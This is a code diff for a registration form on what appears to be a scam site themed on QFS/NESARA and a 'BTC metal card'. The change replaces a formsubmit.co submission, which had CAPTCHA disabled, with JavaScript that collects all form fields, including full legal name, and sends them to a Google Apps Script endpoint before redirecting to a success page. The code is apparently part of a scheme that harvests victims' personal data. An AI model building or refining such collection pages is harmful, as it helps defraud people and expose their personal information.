@@ -44,22 +44,7 @@
   <div class="max-w-xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
     <h2 class="text-2xl font-bold text-center mb-6">Registration Form</h2>
 
-    <form id="registrationForm" 
-          action="https://formsubmit.co/support@qfsnesaragesara.org"
-          method="POST"
-          class="space-y-4">
-
-      <!-- Redirect to Success Page -->
-      <input type="hidden" name="_next" value="https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-registration.html">
-
-      <!-- Disable CAPTCHA -->
-      <input type="hidden" name="_captcha" value="false">
-
-      <!-- Table Email Format -->
-      <input type="hidden" name="_template" value="table">
-
-      <!-- Honeypot (spam protection) -->
-      <input type="text" name="_honey" class="hidden" style="display:none">
+    <form id="registrationForm" class="space-y-4">
 
       <div>
         <label class="font-semibold">Full Legal Name</label>
@@ -125,9 +110,30 @@
     const form = document.getElementById("registrationForm");
     const overlay = document.getElementById("overlay");
 
-    form.addEventListener("submit", function() {
-        // Simply show overlay — DO NOT redirect or block submission
+    form.addEventListener("submit", async function(e) {
+        e.preventDefault(); // prevent default HTML form submission
+
         overlay.classList.add("show");
+
+        const formData = new FormData(form);
+        const jsonData = {};
+
+        formData.forEach((value, key) => { jsonData[key] = value; });
+
+        try {
+            await fetch("https://script.google.com/macros/s/AKfycbzaK0s5nXP9WkjY1E_V-5PztHNOpFV3bmHg0V3VUiot4onSXtcSO92rfIZxnzFust2uJQ/exec", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(jsonData)
+            });
+
+            // Redirect after success
+            window.location.href = "https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-registration.html";
+
+        } catch (error) {
+            alert("Something went wrong. Please try again.");
+            overlay.classList.remove("show");
+        }
     });
   </script>
 
